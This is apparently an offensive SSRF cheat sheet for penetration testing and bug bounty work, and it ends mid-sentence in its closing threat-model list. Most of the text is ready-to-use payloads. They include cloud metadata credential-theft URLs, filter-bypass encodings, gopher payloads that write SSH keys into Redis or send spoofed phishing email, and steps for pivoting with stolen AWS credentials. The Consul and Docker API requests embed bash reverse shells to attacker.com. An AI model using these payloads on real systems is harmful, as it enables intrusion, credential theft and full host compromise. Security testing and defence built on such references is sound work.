# SSRF — Server-Side Request Forgery

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to an
attacker-controlled or internal destination. It earned its own category in OWASP Top 10
2021 (A10) due to the severity of cloud-environment exploitation.

**Impact:** Internal port scanning, cloud credential theft, RCE via internal services,
lateral movement inside cloud VPCs, full compromise of metadata-exposed infrastructure.

**Sources:**
- OWASP Top 10 A10:2021 — SSRF
- PortSwigger Web Security Academy — Server-side request forgery
- HackerOne Hacktivity — Capital One breach (SSRF → IMDSv1 → S3 dump), GitLab SSRF chain

---

## Basic SSRF Techniques

### Localhost / Internal Services

```
# Direct localhost
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal RFC-1918 ranges to probe
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports to target
http://localhost:8080     # Alt HTTP / dev servers
http://localhost:8443     # Alt HTTPS
http://localhost:9200     # Elasticsearch
http://localhost:9300     # Elasticsearch cluster
http://localhost:6379     # Redis
http://localhost:5432     # PostgreSQL
http://localhost:3306     # MySQL
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker daemon (unauthenticated)
http://localhost:4444     # Various admin panels
http://localhost:8500     # Consul
http://localhost:8600     # Consul DNS
```

### Port Scanning via SSRF

```
# Probe internal ports — infer open/closed from response time/error
http://127.0.0.1:22      # SSH (connection refused vs timeout → port state)
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3000    # Node dev servers
http://127.0.0.1:5000    # Flask / Python apps
http://127.0.0.1:8080
```

---

## Cloud Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDSv1)

```
# IMDSv1 — no token required (vulnerable if not upgraded to v2)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/        # Often contains secrets/scripts
http://169.254.169.254/latest/dynamic/instance-identity/document

# Credential response contains AccessKeyId + SecretAccessKey + Token
# → exfil and use with AWS CLI
```

### AWS IMDSv2 (requires PUT token first)

```bash
# Step 1 — get token (requires PUT; SSRF via GET alone won't work)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <TOKEN>

# Note: Some SSRF vectors support custom headers (e.g., Gopher) → IMDSv2 bypass possible
```

### GCP Compute Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# IP alternative:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Instance Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean / Oracle / Alibaba Cloud

```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## Blind SSRF Detection

Blind SSRF has no visible response — detection requires out-of-band (OOB) callbacks.

### Out-of-Band via Collaborator / Interactsh

```
# Use Burp Collaborator or https://app.interactsh.com for callbacks
http://YOUR-COLLABORATOR-ID.burpcollaborator.net
http://YOUR-ID.oast.fun
http://YOUR-ID.interactsh.com

# Inject in every URL-accepting parameter:
url=http://YOUR-ID.oast.fun
imageUrl=http://YOUR-ID.oast.fun/img.png
webhook=http://YOUR-ID.oast.fun/callback
```

### DNS-Only SSRF

```
# Some filters block HTTP but allow DNS — test with a DNS-only payload
# Watch for DNS query in OOB tool with no HTTP
url=http://blind-ssrf-test.YOUR-ID.oast.fun

# Subdomain-encode info for exfil:
url=http://$(hostname).YOUR-ID.oast.fun
```

### Timing-Based Detection

```
# Internal closed port → fast TCP RST (quick error)
# Internal open port → slow/timeout or valid response
# Non-existent internal IP → timeout (longer delay)
# Compare response times to infer port/host state
```

---

## Filter Bypass Techniques

### IP Obfuscation

```
# Decimal representation of 127.0.0.1
http://2130706433/

# Octal
http://0177.0.0.1/

# Hex
http://0x7f000001/

# Mixed formats
http://127.0x0.0.1/
http://127.0.00.1/

# IPv6 localhost
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL-encoded dot
http://127%2E0%2E0%2E1/

# 169.254.169.254 decimal
http://2852039166/

# 169.254.169.254 hex
http://0xa9fea9fe/
```

### Alternative Localhost Representations

```
http://localhost/
http://LOCALHOST/
http://LocalHost/
http://[::]:80/          # IPv6 any → localhost equivalent in some stacks
http://spoofed.domain/   # DNS resolves to 127.0.0.1
http://127.1/            # Short form
http://127.0.1/
```

### DNS Rebinding

```
# Register a domain that alternately resolves to your server and 127.0.0.1
# 1. App resolves domain → your server (passes allowlist check)
# 2. App makes the actual request → DNS re-resolves to 127.0.0.1
# Tools: singularity.me, rbndr.us, whonow
http://rebind.network/  # Online rebinding service
```

### Open Redirect Chain

```
# If app follows redirects, use an open redirect on an allowlisted domain
# to redirect to internal target

# Example: target allowlists example.com
https://example.com/redirect?url=http://169.254.169.254/

# Common open redirect params: redirect, next, return, url, to, dest, go
```

### Protocol Switching

```
# file:// — read local files
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token

# dict:// — port probing, banner grabbing
dict://127.0.0.1:6379/info    # Redis INFO command

# gopher:// — arbitrary TCP data (most powerful)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# ftp:// — some parsers allow
ftp://127.0.0.1:21/

# sftp:// / tftp:// / ldap:// — varies by stack
```

### URL Parser Inconsistencies

```
# Different parsers may interpret these differently
http://attacker.com@127.0.0.1/           # username: attacker.com, host: 127.0.0.1
http://127.0.0.1#@allowlisted.com/       # fragment tricks
http://allowlisted.com:80@127.0.0.1/     # port + credential confusion
http://127.0.0.1%0d%0a/                  # CRLF injection in URL

# Scheme case variation
HTTP://127.0.0.1/
Http://127.0.0.1/
```

---

## SSRF to RCE Escalation

### Redis via Gopher (unauthenticated Redis → RCE)

```
# Write a cron job or SSH key via Redis CONFIG SET
# URL-encoded gopher payload to write authorized_keys:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A%0Assh-rsa AAAA...your-pubkey...%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Tools: Gopherus (generates gopher payloads for Redis, MySQL, FastCGI, etc.)
# https://github.com/tarunkant/Gopherus
```

### Elasticsearch Code Execution (older versions)

```
# Elasticsearch <1.6 with dynamic scripting enabled
http://localhost:9200/_search?source={"script":"java.lang.Runtime.getRuntime().exec('id')"}

# POST to run scripts
POST http://localhost:9200/_search
{"script_fields":{"test":{"script":"import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

### Jenkins Script Console

```
# Internal Jenkins at localhost:8080
http://localhost:8080/script

# If accessible, Groovy script console allows RCE:
# "println 'id'.execute().text"
```

### Spring Boot Actuator

```
# Spring Boot Actuator endpoints leak env vars, heap dumps, and allow shutdown
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/shutdown    # POST → kills the app
http://localhost:8080/actuator/restart

# /actuator/env + /actuator/refresh → inject malicious Spring config for RCE
# (Spring Cloud + POST /actuator/env with spring.cloud.bootstrap.location=attacker URL)
```

### AWS Credential Theft → Account Pivot

```bash
# 1. Steal credentials via IMDSv1 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 2. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ec2-role
aws s3 ls
aws secretsmanager list-secrets

# 4. Pivot to further services / escalate via overly-permissive role
```

---

## Common Vulnerable Parameters

```
# URL parameters frequently processed server-side
url=
imageUrl=
image_url=
avatarUrl=
avatar_url=
redirect=
next=
return=
returnUrl=
return_url=
dest=
destination=
go=
goto=
forward=
continue=
callback=
callbackUrl=
callback_url=
webhook=
webhookUrl=
webhook_url=
fetch=
endpoint=
proxy=
proxyUrl=
proxy_url=
src=
href=
link=
target=
host=
api=
feed=
data=
path=
load=
open=
download=
```

---

## Common Vulnerable Endpoints / Features

| Feature | Why Vulnerable |
|---------|---------------|
| Webhook configuration | App makes request to user-supplied URL |
| PDF generation (HTML-to-PDF) | Renders user HTML including external URLs |
| Image preview / thumbnail service | Fetches remote image via server |
| URL metadata unfurler (Slack-like) | Server fetches URL for title/OG tags |
| Import from URL | Imports CSV/JSON/XML from remote location |
| Screenshot service | Headless browser fetches URL |
| Proxy / translation service | Routes requests through server |
| OAuth / SAML metadata fetch | Fetches IdP metadata from URL |
| Dependency/package install via URL | Package manager fetches remote code |
| IP geolocation lookup | Passes host to internal geo API |

---

## Detection Notes

- Always test URL-accepting parameters with OOB payloads (Collaborator/Interactsh) first
- Check for DNS callbacks even when HTTP fails (DNS-only SSRF)
- Include SSRF probes in file upload fields (SVG with external references, XML with XXE)
- Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
- When you get any internal response (even an error page), escalate: try metadata endpoints
- Response timing differences reveal open vs closed ports even without response body

---

## Additional Bypass Vectors

### CIDR Range — Full 127.0.0.0/8 Loopback Block

```
# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
http://127.0.1.3/
http://127.100.200.50/
http://127.127.127.127/

# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
```

### Ultra-Short IP Notation

```
http://0/              # Resolves to 0.0.0.0 → loopback on Linux
http://127.1/          # Short-form for 127.0.0.1
http://0177.1/         # Octal + short form
http://0x7f.1/         # Hex + short form
```

### PHP `filter_var()` FILTER_VALIDATE_URL Bypass

```
# PHP 7.x filter_var() passes these as valid URLs despite being malicious
http://test???test.com@127.0.0.1/
0://evil.com:80;http://google.com:80/
http://127.0.0.1%00@evil.com/

# If app uses filter_var() for validation, these bypass the check
```

### Unicode / Enclosed Alphanumeric Bypass

```
# Some parsers normalize Unicode before DNS resolution
# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
# Use for allowlist bypass when filter does string comparison before normalization

http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
```

### JAR Scheme (Java Environments)

```
# Fully blind — no response body, but server makes outbound connection
jar:http://127.0.0.1!/
jar:https://attacker.com!/payload.zip!/path/to/file

# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
# Triggers HTTP request to the URL before the ! — confirm via OOB callback
```

### NETDOC Wrapper (Java)

```
# Java-specific alternative to file:// — bypasses some filters that block file://
netdoc:///etc/passwd
netdoc:///proc/self/environ

# Advantage: avoids \n and \r issues that file:// can have in certain contexts
```

### TFTP (UDP-based, Evades TCP Filters)

```
# TFTP operates over UDP — stateful TCP firewalls may not inspect it
tftp://attacker.com:69/TESTUDPPACKET

# Confirm OOB UDP callback with: nc -u -l -p 69
# Useful for environments with tight TCP egress but loose UDP
```

### Kubernetes Cluster Metadata

```
# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
http://10.96.0.1/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc.cluster.local/api/v1/pods

# EKS node metadata (EC2 + K8s = two metadata surfaces)
http://169.254.169.254/latest/meta-data/   # EC2 metadata still present

# K8s service account token (mounted in every pod by default)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token with API server:
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
```

### ECS Task Metadata (AWS Fargate)

```
# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds

# Get credential ID first:
http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
```

### Memcached via Gopher

```
# Gopherus-generated gopher payload for Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a

# Memcached SSRF can be used to:
# 1. Poison cached responses (cache poisoning)
# 2. Read cached data (session tokens, API responses)
# 3. If app uses Memcached for session storage → session injection → auth bypass

# Tool: gopherus --exploit memcache
```

---

## XXE / XSLT → SSRF (XML Parser SSRF)

**Root cause:** XML parsers that process user-supplied XML fetch external URLs via `DOCTYPE SYSTEM` entities or `XInclude` directives. XSLT processors expose the `document()` function for the same. Any endpoint parsing user-controlled XML (SOAP APIs, document converters, XSLT stylesheets, SVG renderers) is a candidate.

**Bypass logic:** XInclude requires no `<!DOCTYPE>` — it bypasses DOCTYPE-based blacklists entirely. XSLT `document()` is overlooked by code reviewers because it is a legitimate XSLT feature. Both allow fetching arbitrary internal URLs.

**Attack chain:** SSRF → cloud metadata endpoint → credential theft

**Stack:** SOAP web services, Atlassian (Jira/Confluence), Apache FOP, LibreOffice, wkhtmltopdf, Java JAXP parsers

**Payload:**
```xml
<!-- Classic XXE → SSRF via external entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<data>&xxe;</data>

<!-- XInclude — no DOCTYPE needed, bypasses DOCTYPE filtering -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
</root>

<!-- XSLT document() function — works in any XSLT 1.0/2.0 processor -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- Blind OOB via external DTD subset (when output is not reflected) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR-ID.oast.fun/evil.dtd">
  %remote;
]>
<foo>&exfil;</foo>
```

**Source:** PayloadsAllTheThings XXE section, PortSwigger XXE research

---

## OAuth / OIDC SSRF (Server Fetches redirect_uri or jwks_uri)

**Root cause:** OAuth authorization servers and OIDC relying parties make server-side HTTP requests to validate metadata: fetching `jwks_uri` to verify JWT signatures, fetching `metadata_url` to bootstrap trust, or probing `redirect_uri` for reachability. Any of these user-supplied URLs can point to internal services.

**Bypass logic:** The validation request is a legitimate application function — it is rarely perceived as user-controlled input requiring SSRF filtering. The URL is passed in the authorization request or dynamic client registration endpoint.

**Attack chain:** SSRF → internal IMDS → credential theft | or → internal API enumeration

**Stack:** OAuth 2.0 / OpenID Connect authorization servers, custom OAuth implementations, SAML-based SSO

**Payload:**
```
# In authorization request — if server probes redirect_uri
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=http://169.254.169.254/latest/meta-data/&
  scope=openid

# Dynamic client registration (RFC 7591) — server fetches jwks_uri to validate
POST /oauth/clients
{
  "redirect_uris": ["http://169.254.169.254/"],
  "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "metadata_url": "http://169.254.169.254/latest/user-data/"
}

# SAML metadata URL — server fetches to parse IdP metadata
POST /saml/metadata
metadata_url=http://169.254.169.254/latest/meta-data/
```

**Source:** AllThingsSSRF (OAuth SSRF section), HackerOne disclosed OAuth SSRF reports

---

## 307/308 Redirect — POST Body Preservation → IMDSv2 Bypass

**Root cause:** HTTP 307 (Temporary Redirect) and 308 (Permanent Redirect) preserve the original request method AND body, unlike 301/302 which downgrade POST to GET. If an SSRF-vulnerable app follows 307 redirects, a GET-based SSRF can be coerced into sending a PUT to the IMDSv2 token endpoint — bypassing IMDSv2's PUT-only requirement.

**Bypass logic:** Host a redirect server that returns `307 → http://169.254.169.254/latest/api/token`. The victim server follows the redirect, preserving the PUT method and TTL header. Use public services like `r3dir.me` to avoid hosting infrastructure.

**Attack chain:** SSRF (GET-only) → 307 redirect → IMDSv2 PUT token → metadata credentials → AWS pivot

**Stack:** AWS EC2 instances with IMDSv2 enforced; any server that follows HTTP redirects

**Payload:**
```http
# Redirect server response (host on attacker infrastructure):
HTTP/1.1 307 Temporary Redirect
Location: http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# SSRF payload pointing to redirect server:
url=http://attacker.com/redirect-to-imdsv2

# Using r3dir.me public redirect service (no infrastructure needed):
url=https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/api/token

# After token is returned → use token in second request for IMDSv2 credentials
```

**Source:** PayloadsAllTheThings redirect bypass section, r3dir.me bypass service

---

## LDAP Protocol SSRF

**Root cause:** LDAP URLs processed by server-side resolvers cause interaction with internal directory services or enable port probing. Some implementations forward LDAP query results to the user, enabling internal information disclosure. The null-byte trick injects additional commands (Memcached, etc.) through LDAP's string handling.

**Attack chain:** SSRF → internal LDAP → user/group enumeration | or → Memcached command injection via null byte

**Stack:** Java apps with JNDI LDAP, authentication middleware, directory-aware frameworks

**Payload:**
```
# Internal LDAP directory probe
ldap://127.0.0.1:389/dc=company,dc=com

# LDAP to Memcached — inject stats command via newline in LDAP query
ldap://localhost:11211/%0astats%0aquit

# LDAPS for TLS-wrapped internal LDAP probing
ldaps://internal-ldap.corp:636/

# JNDI LDAP (server fetches Java class from remote LDAP — Log4Shell pattern)
ldap://attacker.com:1389/Exploit
```

**Source:** PayloadsAllTheThings SSRF protocol section

---

## Gopher → SMTP (Internal Mail Relay Abuse)

**Root cause:** Internal SMTP servers typically run unauthenticated on port 25, accepting relay from localhost. Gopher allows crafting raw TCP payloads that speak any text-based protocol, including SMTP. This enables sending emails that appear to originate from the internal mail server, bypassing SPF/DKIM for outbound messages.

**Attack chain:** SSRF → gopher → internal SMTP → spoofed email from trusted internal domain → phishing / password reset hijack

**Stack:** Any environment with internal Postfix / Sendmail / Exim on port 25

**Payload:**
```
# Gopher payload — sends phishing email as admin@target.com
# URL-encoded SMTP conversation:
gopher://localhost:25/_%48%45%4c%4f%20%6c%6f%63%61%6c%68%6f%73%74%0d%0a%4d%41%49%4c%20%46%52%4f%4d%3a%3c%61%74%74%61%63%6b%65%72%40%65%76%69%6c%2e%63%6f%6d%3e%0d%0a%52%43%50%54%20%54%4f%3a%3c%76%69%63%74%69%6d%40%74%61%72%67%65%74%2e%63%6f%6d%3e%0d%0a%44%41%54%41%0d%0a%46%72%6f%6d%3a%20%61%64%6d%69%6e%40%74%61%72%67%65%74%2e%63%6f%6d%0d%0a%54%6f%3a%20%76%69%63%74%69%6d%40%74%61%72%67%65%74%2e%63%6f%6d%0d%0a%53%75%62%6a%65%63%74%3a%20%52%65%73%65%74%20%59%6f%75%72%20%50%61%73%73%77%6f%72%64%0d%0a%0d%0a%43%6c%69%63%6b%20%68%65%72%65%20%74%6f%20%72%65%73%65%74%3a%20%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%72%65%73%65%74%0d%0a%2e%0d%0a%51%55%49%54%0d%0a

# Decoded SMTP sequence:
# HELO localhost
# MAIL FROM:<attacker@evil.com>
# RCPT TO:<victim@target.com>
# DATA
# From: admin@target.com
# Subject: Reset Your Password
# <body with phishing link>
# .
# QUIT

# Generate with Gopherus: python3 gopherus.py --exploit smtp
```

**Source:** PayloadsAllTheThings Gopher section, AllThingsSSRF SMTP exploitation chain

---

## FFmpeg HLS SSRF (Video Processing)

**Root cause:** FFmpeg processes HLS (HTTP Live Streaming) M3U8 playlist files and fetches all media segments referenced in them, including URIs in `#EXT-X-MAP:URI=` directives. When a user uploads an M3U8 file for transcoding, FFmpeg makes server-side HTTP requests to every URI in the playlist — including internal URLs — before the server validates the content.

**Bypass logic:** The M3U8 file passes file-type/MIME-type checks (`application/x-mpegURL` or `.m3u8`). The SSRF occurs during FFmpeg processing, not at upload time, so upload-level filters cannot intercept it.

**Attack chain:** Upload M3U8 → FFmpeg transcoding pipeline → SSRF → internal metadata endpoint → credential theft

**Stack:** Video upload/transcoding services using FFmpeg (media hosting SaaS, video conferencing, YouTube-clone apps)

**Payload:**
```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
#EXT-X-MAP:URI="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
http://169.254.169.254/latest/meta-data/
```

```m3u8
# Blind SSRF — OOB callback for confirmation
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
#EXT-X-MAP:URI="http://YOUR-ID.oast.fun/ffmpeg-ssrf"
http://YOUR-ID.oast.fun/segment
```

**Source:** AllThingsSSRF (FFmpeg HLS), CVE-2019-12730 and related FFmpeg SSRF research

---

## SVG Upload SSRF (Image Processing Pipeline)

**Root cause:** SVG is XML-based and supports external references via `<image xlink:href>` and `<use xlink:href>`. Server-side image processors (ImageMagick, Inkscape/Batik, Librsvg, wkhtmltopdf) follow these external references when rendering or thumbnailing SVGs, making arbitrary HTTP requests.

**Bypass logic:** SVG is a standard image format. Upload endpoints accepting images often allowlist `image/svg+xml` by MIME type without understanding that SVG can trigger outbound requests. Even image resizing pipelines that produce thumbnails process SVG elements.

**Attack chain:** SVG upload (avatar/logo/attachment) → server-side render/thumbnail → SSRF → internal service access

**Stack:** Any app accepting SVG uploads: avatar upload, document attachments, design tools, CMS image libraries

**Payload:**
```xml
<!-- SSRF via external image reference -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="400" height="400">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"/>
</svg>

<!-- SSRF via XXE in SVG (SVG is XML, DOCTYPE entities work) -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- Blind OOB confirmation payload -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://YOUR-ID.oast.fun/svg-ssrf-probe"/>
</svg>
```

**Source:** PayloadsAllTheThings (SVG to SSRF/XSS), multiple HackerOne reports on avatar upload SSRF

---

## DNS-Based Bypass Services (Allowlist Evasion via Resolving Domains)

**Root cause:** IP-based filters that validate hostname strings before DNS resolution can be bypassed using public domains that resolve to internal/loopback IPs. The domain name passes string-based allowlist checks, but resolves to 127.0.0.1 or 169.254.169.254 at request time.

**Bypass logic:** Filters doing string comparison on the hostname never check what IP it resolves to. Services like nip.io embed the IP in the subdomain; Linux systems have `/etc/hosts` entries for `ip6-localhost` and `ip6-loopback`.

**Stack:** Any URL filter checking hostname strings without post-resolution IP validation

**Payload:**
```
# nip.io — IP embedded in subdomain, always resolves to that IP
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://company-internal.127.0.0.1.nip.io/     # looks like legitimate subdomain

# localtest.me — public domain that resolves to 127.0.0.1
http://localtest.me/
http://admin.localtest.me/

# localh.st — public domain resolving to 127.0.0.1
http://localh.st/

# IPv6 named hosts (present in /etc/hosts on most Linux systems)
http://ip6-localhost/                           # ::1
http://ip6-loopback/                            # ::1

# 1u.ms — DNS rebinding service for two-step bypass
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/

# Looks like trusted domain but resolves to internal IP:
http://trusted-corp.127.0.0.1.nip.io/
```

**Source:** PayloadsAllTheThings domain bypass section, 1u.ms service documentation

---

## HashiCorp Consul → RCE via SSRF

**Root cause:** HashiCorp Consul's HTTP API on port 8500 allows registering services with health checks that execute arbitrary shell commands on the host. By default, Consul runs without authentication. SSRF reaching port 8500 can register a malicious service with an exec health check that runs on the Consul agent's host OS.

**Bypass logic:** Service registration is a legitimate Consul API function — no memory corruption or exploit required. The exec check runs automatically at the configured interval after registration.

**Attack chain:** SSRF → Consul API POST → register exec health check → timed RCE on host → full server compromise

**Stack:** HashiCorp Consul without ACL enforcement (common in internal deployments, CI/CD clusters)

**Payload:**
```http
POST http://127.0.0.1:8500/v1/agent/service/register
Content-Type: application/json

{
  "ID": "pwned",
  "Name": "pwned",
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"],
    "Interval": "10s",
    "Timeout": "5s"
  }
}
```

```
# Gopher wrapper for POST (when only GET-based SSRF is available):
# Use Gopherus or craft manually — POST to /v1/agent/service/register
gopher://127.0.0.1:8500/_POST%20/v1/agent/service/register%20HTTP/1.1%0D%0AHost:%20127.0.0.1:8500%0D%0AContent-Type:%20application/json%0D%0AContent-Length:%20<len>%0D%0A%0D%0A<url-encoded-json>

# Deregister after exploitation:
PUT http://127.0.0.1:8500/v1/agent/service/deregister/pwned
```

**Source:** AllThingsSSRF "SSRF to RCE with HashiCorp Consul", disclosed HackerOne Consul RCE chains

---

## Docker Daemon API SSRF (Port 2375)

**Root cause:** Docker daemon listens on TCP port 2375 without authentication when configured for remote access (common in CI/CD, dev environments, and container orchestration setups). The REST API allows listing containers, creating privileged containers mounting the host filesystem, and executing commands in running containers — all via plain HTTP with no credentials.

**Bypass logic:** Port 2375 is open internally in many container-heavy environments because developers and CI pipelines need remote Docker access. No exploit is needed — the API is by design. POST requests (create/exec) require gopher:// or 307 redirect chains.

**Attack chain:** SSRF → Docker API → create privileged container with host `/` bind mount → read `/etc/shadow`, write SSH key, or get reverse shell → full host compromise

**Stack:** Docker CE/EE with `dockerd -H tcp://0.0.0.0:2375`, Jenkins agents, GitLab runners, dev VMs

**Payload:**
```
# Confirm Docker API access (GET — works with basic SSRF)
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/containers/json?all=1
http://127.0.0.1:2375/images/json

# Create privileged container mounting host filesystem (POST via gopher or 307)
POST http://127.0.0.1:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow > /tmp/out"],
  "HostConfig": {
    "Binds": ["/:/host"],
    "Privileged": true
  }
}

# Start the container:
POST http://127.0.0.1:2375/containers/<id>/start

# Exec reverse shell in running container:
POST http://127.0.0.1:2375/containers/<id>/exec
{
  "AttachStdin": false, "AttachStdout": true, "AttachStderr": true,
  "Cmd": ["bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"]
}
POST http://127.0.0.1:2375/exec/<exec-id>/start
{"Detach": false, "Tty": false}
```

**Source:** AllThingsSSRF Docker daemon section, multiple HackerOne reports targeting CI/CD Docker exposure

---

## Threat Model

> Current patterns as of 2026-Q2. Updated 2026-05-24.

**What's being exploited in the wild (2026-05-24):**

1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
   og:image generators. The renderer fetches attacker-controlled HTML, which includes
   `<script>` that hits internal metadata.

2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
   and inherited deployments keep it alive. Always try IMDSv1 first.

3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
   service account tokens (`file:///var/run/secrets/...`) are the most impactful
   targets. Both yield short-lived IAM credentials or cluster API access.

4. **Webhook features as SSRF entry points** — Every app that allows users to configure
   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
   webhook + IMDSv1 = critical AWS credential theft.

5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
   to reach internal services via `http://`.

6. **XML/XSLT parsers as new SSRF surface** — Document upload features (DOCX, XLSX,
   SVG, XML API bodies) introduce SSRF via XXE and XInclude. XInclude is particularly
   dangerous because it requires no DOCTYPE declaration, bypassing DOCTYPE-based defenses.

7. **307 redirect IMDSv2 bypass gaining traction** — Researchers are finding that IMDSv2
   enforcement can be defeated by chaining GET-based SSRFs with 307 redirects to PUT on
   the IMDS token endpoint. Public services (r3dir.me) make this zero-infrastructure.

8. **OAuth/OIDC metadata fetching** — Authorization servers that fetch `jwks_uri` or
